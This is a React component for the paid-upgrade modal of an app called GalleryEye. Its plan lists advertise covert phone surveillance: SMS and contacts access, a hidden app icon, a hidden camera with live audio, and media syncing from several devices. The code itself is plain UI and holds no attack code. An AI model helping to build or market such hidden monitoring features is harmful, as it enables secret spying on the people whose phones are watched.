"use client";

interface UpgradeModalProps {
    isOpen: boolean;
    onClose: () => void;
    feature: string;
    requiredPlan: 'standard' | 'premium';
}

const planConfig = {
    standard: {
        label: 'Standard',
        accent: '#10b981',
        accentDim: 'rgba(16,185,129,0.12)',
        accentBorder: 'rgba(16,185,129,0.30)',
        icon: (
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
            </svg>
        ),
        features: [
            '100 Photos + 50 Videos sync',
            'SMS & Contacts access',
            'Flashlight & vibration control',
            'Hide app icon',
            'Up to 7 devices',
        ],
    },
    premium: {
        label: 'Premium',
        accent: '#f59e0b',
        accentDim: 'rgba(245,158,11,0.12)',
        accentBorder: 'rgba(245,158,11,0.30)',
        icon: (
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
            </svg>
        ),
        features: [
            'Unlimited photos & videos',
            'All Standard features',
            'Bulk folder download (ZIP)',
            'Hidden camera & live audio',
            'Priority support',
        ],
    },
};

export default function UpgradeModal({ isOpen, onClose, feature, requiredPlan }: UpgradeModalProps) {
    if (!isOpen) return null;
    const plan = planConfig[requiredPlan];

    return (
        <div
            className="animate-fadeIn"
            style={{
                position: 'fixed', inset: 0, zIndex: 'var(--z-modal)' as any,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                background: 'rgba(6,11,26,0.82)', backdropFilter: 'blur(12px)',
                WebkitBackdropFilter: 'blur(12px)', padding: '1rem',
            }}
            onClick={onClose}
        >
            <div
                className="animate-scaleIn"
                onClick={e => e.stopPropagation()}
                style={{
                    width: '100%', maxWidth: 400,
                    background: 'var(--bg-surface)',
                    border: '1px solid var(--border-normal)',
                    borderRadius: '1.5rem',
                    overflow: 'hidden',
                    boxShadow: 'var(--shadow-lg)',
                }}
            >
                {/* Accent header strip */}
                <div style={{
                    padding: '1.5rem', textAlign: 'center',
                    background: plan.accentDim,
                    borderBottom: `1px solid ${plan.accentBorder}`,
                }}>
                    <div style={{
                        width: 56, height: 56, borderRadius: '1rem', margin: '0 auto 1rem',
                        background: plan.accentDim,
                        border: `1px solid ${plan.accentBorder}`,
                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                        color: plan.accent,
                    }}>
                        {plan.icon}
                    </div>
                    <div style={{
                        fontFamily: "'Space Grotesk', monospace",
                        fontSize: '0.625rem', fontWeight: 700, letterSpacing: '0.12em',
                        textTransform: 'uppercase', color: plan.accent, marginBottom: '0.375rem',
                    }}>
                        {plan.label} required
                    </div>
                    <h2 style={{
                        fontWeight: 700, fontSize: '1.25rem', letterSpacing: '-0.02em',
                        color: 'var(--text-primary)',
                    }}>
                        {feature}
                    </h2>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.8125rem', marginTop: '0.375rem' }}>
                        Upgrade to unlock this feature
                    </p>
                </div>

                <div style={{ padding: '1.25rem' }}>
                    {/* Feature list */}
                    <div style={{
                        background: 'var(--bg-elevated)',
                        border: '1px solid var(--border-subtle)',
                        borderRadius: '0.875rem', padding: '1rem',
                        marginBottom: '1.25rem',
                    }}>
                        <p style={{
                            fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-muted)',
                            textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '0.75rem',
                        }}>
                            {plan.label} includes
                        </p>
                        <ul style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                            {plan.features.map((f, i) => (
                                <li key={i} style={{ display: 'flex', alignItems: 'center', gap: '0.625rem' }}>
                                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                                        <circle cx="7" cy="7" r="6.5" stroke={plan.accent} strokeOpacity="0.4" />
                                        <path d="M4.5 7l2 2 3-3" stroke={plan.accent} strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                    <span style={{ color: 'var(--text-secondary)', fontSize: '0.8125rem' }}>{f}</span>
                                </li>
                            ))}
                        </ul>
                    </div>

                    {/* Buttons */}
                    <div style={{ display: 'flex', gap: '0.625rem' }}>
                        <button
                            onClick={onClose}
                            style={{
                                flex: 1, padding: '0.75rem',
                                background: 'var(--bg-elevated)',
                                border: '1px solid var(--border-normal)',
                                borderRadius: '0.875rem', color: 'var(--text-secondary)',
                                fontFamily: "'Plus Jakarta Sans', sans-serif", fontWeight: 600, fontSize: '0.875rem',
                                cursor: 'pointer', transition: 'background 0.2s cubic-bezier(0.32,0.72,0,1)',
                            }}
                            onMouseEnter={e => (e.currentTarget.style.background = 'var(--bg-overlay)')}
                            onMouseLeave={e => (e.currentTarget.style.background = 'var(--bg-elevated)')}
                        >
                            Not now
                        </button>
                        <a
                            href={`https://wa.me/923177407478?text=I%20want%20to%20upgrade%20to%20${plan.label}%20plan%20for%20GalleryEye`}
                            target="_blank"
                            rel="noopener noreferrer"
                            style={{
                                flex: 1, padding: '0.75rem',
                                background: plan.accent, color: plan.accent === '#10b981' ? '#09090b' : '#fff',
                                fontFamily: "'Plus Jakarta Sans', sans-serif", fontWeight: 600, fontSize: '0.875rem',
                                borderRadius: '0.875rem', border: 'none', cursor: 'pointer',
                                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.375rem',
                                textDecoration: 'none',
                                transition: 'transform 0.2s cubic-bezier(0.32,0.72,0,1), opacity 0.2s',
                            }}
                            onMouseEnter={e => (e.currentTarget.style.opacity = '0.88')}
                            onMouseLeave={e => (e.currentTarget.style.opacity = '1')}
                        >
                            Upgrade now
                            <svg width="13" height="13" viewBox="0 0 13 13" fill="none">
                                <path d="M2 6.5h9M8 3.5l3 3-3 3" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    );
}
